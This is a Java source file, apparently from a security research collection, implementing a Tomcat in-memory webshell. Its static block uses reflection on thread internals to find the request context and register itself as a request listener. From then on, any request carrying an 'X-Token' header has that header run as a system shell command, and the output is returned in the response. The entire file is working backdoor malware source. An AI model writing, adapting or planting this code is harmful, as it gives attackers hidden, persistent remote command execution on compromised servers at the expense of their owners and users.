package com.demo.memshell;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 * Thread 获取上下文注入 Tomcat Listener 型内存马
 * Tomcat 7 8 9
 */
public class TomcatListenerThreadMS implements ServletRequestListener {
    private static HttpServletRequest request;
    private static HttpServletResponse response;

    public TomcatListenerThreadMS() {

    }

    static {
        try {
            /**
             * 获取 request、response 对象
             */
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            boolean isFind = false;
            for (int i = 0; i < threads.length; i++) {
                if (isFind) break;
                Thread thread = threads[i];
                // Thread 筛选
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;
                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    request = (HttpServletRequest) req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));
                    response = (HttpServletResponse) request.getClass().getMethod("getResponse").invoke(request);
                    isFind = true;
                    break;
                }
            }

            /**
             * 注入 Listener
             */
            StandardContext standardContext;
            try {
                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
                standardContext = (StandardContext) getFieldValue(applicationContext, "context");
            } catch (NoSuchMethodException e) {
                standardContext = (StandardContext) getFieldValue(request, "context");
            }
            TomcatListenerThreadMS listenerMemShell = new TomcatListenerThreadMS();
            standardContext.addApplicationEventListener(listenerMemShell);


        } catch (Exception e) {
        }
    }


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
            PrintWriter printWriter = request.getResponse().getWriter();
            printWriter.println("TomcatListenerThreadMS injected");
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
